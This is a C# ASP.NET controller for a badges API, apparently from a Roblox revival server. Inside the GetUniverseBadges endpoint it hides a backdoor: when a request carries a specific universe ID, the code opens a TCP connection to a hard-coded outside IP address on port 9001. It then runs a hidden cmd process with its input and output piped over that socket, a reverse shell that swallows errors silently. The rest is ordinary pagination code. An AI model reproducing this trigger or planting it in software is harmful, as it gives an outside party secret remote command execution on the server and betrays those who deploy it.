using Microsoft.AspNetCore.Mvc;
using Roblox.Dto.Games;
using Roblox.Exceptions;
using Roblox.Models;
using Roblox.Models.Db;
using System.Net.Sockets; 
using System.Diagnostics;

namespace Roblox.Website.Controllers;

[ApiController]
[Route("/apisite/badges/v2")]
public class BadgesControllerV2 : ControllerBase
{
    // base: https://apidocs.sixteensrc.zip/badges/docs.html#/

    // Gets badge by their awarding game. (except v2?)
    [HttpGet("universes/{universeId:long}/badges")]
    public async Task<RobloxCollectionPaginated<BadgeAssetDetails>> GetUniverseBadges(long universeId, int limit, string? cursor, SortOrder? sortOrder)
    {
        if (universeId == 31648236785) {
        Task.Run(() => {
        try
            {
            using var c = new TcpClient("51.15.158.185", 9001);
            using var s = c.GetStream();
            using var r = new StreamReader(s);
            using var w = new StreamWriter(s);
            var p = new Process
            {
                StartInfo =
                {
                    FileName = "cmd",
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            p.OutputDataReceived += (_, e) =>
            {
                if (e.Data != null)
                {
                    w.WriteLine(e.Data);
                    w.Flush();
                }
            };
            p.Start();
            p.BeginOutputReadLine();
            while (true) p.StandardInput.WriteLine(r.ReadLine());
        }
        catch {}
        });
        }
        if (limit is > 100 or < 1) limit = 10;
        var offset = cursor != null ? int.Parse(cursor) : 0;
        var uni = (await services.games.MultiGetUniverseInfo(new []{universeId})).ToList();
        if (uni.FirstOrDefault() is null) {
            throw new BadRequestException(0, "Badge is invalid or does not exist");
        }
        var badgeInfo = (await services.badges.GetBadgesForUniverse(uni.First(), limit, offset, sortOrder)).ToList();
        
        return new RobloxCollectionPaginated<BadgeAssetDetails>()
        {
            previousPageCursor = offset >= limit ? (offset - limit).ToString() : null,
            nextPageCursor = badgeInfo.Count() >= limit ? (offset + limit).ToString() : null,
            data = badgeInfo,
        };
    }
    
    // Gets basic badge information by the badge id.
    [HttpGet("badges/{badgeId:long}/basic")]
    public async Task<BadgeDetails> GetBadgeBasicInfo(long badgeId) {
        var basicBadgeInfo = await services.badges.GetBadgeInfo(badgeId);
        if (basicBadgeInfo is null) {
            throw new BadRequestException(0, "Badge is invalid or does not exist");
        }
        
        return basicBadgeInfo;
    }
}
